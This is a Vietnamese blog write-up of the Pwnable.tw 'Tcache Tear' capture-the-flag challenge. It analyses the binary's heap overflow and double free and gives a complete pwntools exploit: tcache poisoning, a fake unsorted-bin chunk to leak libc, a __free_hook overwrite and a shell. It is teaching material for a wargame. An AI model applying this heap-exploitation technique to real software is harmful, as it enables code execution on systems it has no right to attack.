---
title:  "Pwnable.tw - Tcache Tear"
date:   2025-04-01 10:00:00 +0700
header:
  teaser: "assets/images/2025-04-01-pwntw-tcachetear/Screenshot 2025-04-01 101542.png"
categories: 
  - pwnable
tags:
  - pwnable.tw
  - elf
  - heap
  - double-free
  - tcache
  - unsorted bin
---

Xin chào các độc giả! Trong bài viết này tôi sẽ nói về challenge Tcache Tear của Pwnable.tw wargame. Tôi sẽ viết thật chi tiết nên nó sẽ rất dài đấy. Bắt đầu thôi!  
![Challenge description](/assets/images/2025-04-01-pwntw-tcachetear/Screenshot%202025-04-01%20101542.png){:class="img-responsive"}

## Phân tích
### Tổng quan
Challenge cho ta một elf binary cùng với libc phiên bản 2.27. Các chế độ bảo vệ đều đã bật ngoại trừ PIE.  
![Checksec](/assets/images/2025-04-01-pwntw-tcachetear/Screenshot%202025-04-01%20201341.png){:class="img-responsive"}
Hãy cùng phân tích code trong IDA:

```cpp
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) {
  __int64 choice; // rax
  unsigned int i; // [rsp+Ch] [rbp-4h]

  init_setup(a1, a2, a3);
  printf("Name:");
  read_data(&name, 32LL);
  i = 0;
  while ( 1 ) {
    while ( 1 ) {
      print_menu();
      choice = read_int();
      if ( choice != 2 )
        break;
      if ( i <= 7 ) {
        free(ptr);
        ++i;
      }
    }
    if ( choice > 2 ) {
      if ( choice == 3 ) {
        info();
      }
      else {
        if ( choice == 4 )
          exit(0);
invalid:
        puts("Invalid choice");
      }
    }
    else {
      if ( choice != 1 )
        goto invalid;
      malloc_0();
    }
  }
}
```

Khi chạy chương trình nó sẽ hỏi tên user (Độ dài tối đa 32 bytes), sau đó sẽ đưa ra có 4 lựa chọn:  
1, Alloc 1 chunk với size không lớn hơn 0xff bytes nhưng chỉ đọc vào `size - 16` bytes data. Chỉ có 1 chunk duy nhất được sử dụng ở mọi thời điểm, địa chỉ chunk được lưu trong biến toàn cục `ptr`.

```cpp
int malloc_0() {
  unsigned __int64 v0; // rax
  int size; // [rsp+8h] [rbp-8h]

  printf("Size:");
  v0 = read_int();
  size = v0;
  if ( v0 <= 0xFF ) {
    ptr = malloc(v0);
    printf("Data:");
    read_data(ptr, (unsigned int)(size - 16));
    LODWORD(v0) = puts("Done !");
  }
  return v0;
}
```

2, Free chunk (tối đa 8 lần free).  
3, In ra tên của user (được lưu trong `name`).

```cpp
ssize_t info() {
  printf("Name :");
  return write(1, &name, 0x20uLL);
}
```

4, Thoát chương trình (Dùng exit).

### Một vài nhận xét
+ Ở chức năng thứ nhất, size có kiểu **unsigned**, như vậy khi ta cho size nhỏ hơn 16 thì sẽ gây ra tràn heap.
+ Ở chức năng thứ hai, chương trình không set null sau khi đã free con trỏ, sử dụng để gây lỗi double free.
+ Sẽ cần phải leak được libc base để gọi `system('/bin/sh')`, mà chức năng duy nhất có thể in gì đó ra màn hình là chức năng số 3, in tên user. Bằng cách tạo một chunk giả mạo tại vị trí của biến `name` rồi làm cho nó lọt vào **unsorted bin** (tận dụng tràn heap), khi đó con trỏ **fd** và **bk** của chunk sẽ trỏ tới `main_arena + 88` là địa chỉ nằm trong libc, chính xác là thứ ta cần. 

## Khai thác
Dựa vào những điều nêu trên, các bước khai thác bài này sẽ như sau:  
1, Tạo một chunk giả tại nơi lưu tên người dùng với size lớn hơn 0x410 để khi free nó sẽ rơi vào unsorted bin (đừng quên flag PREV_INUSE).

```python
con.sendlineafter(b'Name:', p64(0) + p64(0x501)) # Fake chunk's metadata
```

2, Sử dụng kỹ thuật [tcache dup](https://github.com/shellphish/how2heap/blob/master/obsolete/glibc_2.27/tcache_dup.c) sao cho malloc được chunk giả đã tạo. Sau đó free để nó rơi vào unsorted bin.

```python
def malloc1(size, payload):
    con.sendlineafter(b'Your choice :', b'1')
    con.sendlineafter(b'Size:', size)
    con.sendlineafter(b'Data:', payload)

def free2():
    con.sendlineafter(b'Your choice :', b'2')

malloc1(b'15', b'abcd1') # p1
free2() # tcache[0x10] = [p1]
free2() # tcache[0x10] = [p1 -> p1]
malloc1(b'15', p64(NAME_ADDR + 0x10)) # tcache[0x10] = [p1 -> name]
malloc1(b'15', b'abcd2') # tcache[0x10] = [name]
malloc1(b'15', b'abcd3') # fake chunk
free2()
```

Giai đoạn này sẽ không đơn giản vậy! Chạy thử script:

```bash
[DEBUG] Received 0xd3 bytes:
    b'Done !\n'
    b'$$$$$$$$$$$$$$$$$$$$$$$\n'
    b'      Tcache tear     \n'
    b'$$$$$$$$$$$$$$$$$$$$$$$\n'
    b'  1. Malloc            \n'
    b'  2. Free              \n'
    b'  3. Info              \n'
    b'  4. Exit              \n'
    b'$$$$$$$$$$$$$$$$$$$$$$$\n'
    b'Your choice :'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x22 bytes:
    b'double free or corruption (!prev)\n'
```

Tại sao vậy? Nhìn vào [source](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L4281), thấy được lỗi là do cờ PREV_INUSE của chunk giả chưa được set:

```cpp
/* Or whether the block is actually not marked used.  */
if (__glibc_unlikely (!prev_inuse(nextchunk)))
  malloc_printerr ("double free or corruption (!prev)");
```

Bypass bằng cách thêm 1 chunk giả nữa liền sau có cờ PREV_INUSE, điều này là hoàn toàn có thể làm được nhờ tràn heap.  
Kích thước của chunk liền sau này là không quan trọng.

```python
malloc1(b'15', \
  (p64(0)*3 + p64(NAME_ADDR + 0x10) + p64(0)*154) + \
  (p64(0) + p64(0x21))) # fake chunk
```

Chạy lại:

```bash
[DEBUG] Received 0xd3 bytes:
    b'Done !\n'
    b'$$$$$$$$$$$$$$$$$$$$$$$\n'
    b'      Tcache tear     \n'
    b'$$$$$$$$$$$$$$$$$$$$$$$\n'
    b'  1. Malloc            \n'
    b'  2. Free              \n'
    b'  3. Info              \n'
    b'  4. Exit              \n'
    b'$$$$$$$$$$$$$$$$$$$$$$$\n'
    b'Your choice :'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x1d bytes:
    b'corrupted size vs. prev_size\n'
```

Quay qua [source](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L1406) một lần nữa:

```cpp
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      
      malloc_printerr ("corrupted size vs. prev_size");			      
    FD = P->fd;								      
    BK = P->bk;								      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      
      malloc_printerr ("corrupted double-linked list");			      
    else {								     
        FD->bk = BK;							     
        BK->fd = FD;							     
        if (!in_smallbin_range (chunksize_nomask (P))			      
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    
	      malloc_printerr ("corrupted double-linked list (not small)");   
            if (FD->fd_nextsize == NULL) {				      
                if (P->fd_nextsize == P)				      
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      
                else {							      
                    FD->fd_nextsize = P->fd_nextsize;			      
                    FD->bk_nextsize = P->bk_nextsize;			      
                    P->fd_nextsize->bk_nextsize = FD;			      
                    P->bk_nextsize->fd_nextsize = FD;			      
                  }							      
              } else {							      
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      
              }								      
          }								      
      }									      
}
```

Bạn đọc nên tìm hiểu về unlink trước khi đọc tiếp. Nhưng nhìn chung, trước khi đặt 1 chunk vào unsorted bin thì libc sẽ cố gắng hợp nhất các chunk phía sau và phía trước của chunk đang xét nếu chúng đã được free, lần lượt gọi là backward và forward consolidate. Trong trường hợp của chúng ta thì chẳng có chunk nào phía sau cả. Chỉ có chunk phía trước (lúc nãy ta thêm để tránh lỗi PREV_INUSE) là đã bị lỗi khi libc cố gắng unlink.

```cpp
/* consolidate backward */
if (!prev_inuse(p)) {
  prevsize = prev_size (p);
  size += prevsize;
  p = chunk_at_offset(p, -((long) prevsize));
  unlink(av, p, bck, fwd);
}
if (nextchunk != av->top) {
  /* get and clear inuse bit */
  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

  /* consolidate forward */
  if (!nextinuse) {
    unlink(av, nextchunk, bck, fwd); // lỗi ở đây
    size += nextsize;
  } else
    clear_inuse_bit_at_offset(nextchunk, 0);
  /*
  Place the chunk in unsorted chunk list. Chunks are
  not placed into regular bins until after they have
  been given one chance to be used in malloc.
  */
    ...
}
```

Ta bypass bằng cách thêm một chunk nữa được set flag PREV_INUSE ở ngay sau để `nextinuse` true là được.

```python
malloc1(b'15', \
  (p64(0)*3 + p64(NAME_ADDR + 0x10) + p64(0)*154) + \
  (p64(0) + p64(0x21) + p64(0)*2) + \
  (p64(0) + p64(0x21))) # fake chunk
```

Thế là đã xong bước 2.  
Bước cuối là leak libc và ghi đè `__free_hook` thành system, sau đó lấy shell là được. Sau đây là toàn bộ mã khai thác.

```python
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./tcache_tear_patched", checksec = False)
libc = ELF("./libc.so.6", checksec = False)

con = process()
# con = remote("chall.pwnable.tw", 10207)

def debug_from_here():
    gdb.attach(con, gdb_args=['-ex', 'init-gef'], gdbscript = '''
        b*0x400b14
        b*0x400c54
    ''')
    input()

def malloc1(size, payload):
    con.sendlineafter(b'Your choice :', b'1')
    con.sendlineafter(b'Size:', size)
    con.sendlineafter(b'Data:', payload)

def free2():
    con.sendlineafter(b'Your choice :', b'2')

def libc_leak():
    con.sendlineafter(b'Your choice :', b'3')
    con.recvuntil(b'Name :')
    con.recv(16)
    return u64(con.recv(8))

NAME_ADDR = 0x602060

con.sendlineafter(b'Name:', p64(0) + p64(0x501)) # Fake chunk's metadata
malloc1(b'15', b'abcd1') # p1
free2() # tcache[0x10] = [p1]
free2() # tcache[0x10] = [p1 -> p1]

malloc1(b'15', p64(NAME_ADDR + 0x10)) # tcache[0x10] = [p1 -> name]
malloc1(b'15', b'abcd2') # tcache[0x10] = [name]
malloc1(b'15', (p64(0)*3 + p64(NAME_ADDR + 0x10) + p64(0)*154) + (p64(0) + p64(0x21) + p64(0)*2) + (p64(0) + p64(0x21))) # fake chunk
free2()

libc.address = libc_leak() - 0x3ebca0
log.success(hex(libc.address))

malloc1(b'31', b'abcd3') # p2
free2() # tcache[0x20] = [p2]
free2() # tcache[0x20] = [p2 -> p2]
malloc1(b'31', p64(libc.sym['__free_hook'])) # tcache[0x20] = [p2 -> __free_hook]
malloc1(b'31', 'abcd4') # tcache[0x20] = [__free_hook]
malloc1(b'31', p64(libc.sym['system']))

malloc1(b'15', b'/bin/sh')
free2() 

con.interactive()
```

Cảm ơn vì đã đọc tới đây. Nếu phát hiện có sai sót nào trong bài viết hãy để lại 1 comment nhắc tôi ở phía dưới nhé!

![Solved](/assets/images/2025-03-25-pwntw-realloc/Screenshot%202025-03-26%20120324.png){:class="img-responsive"}
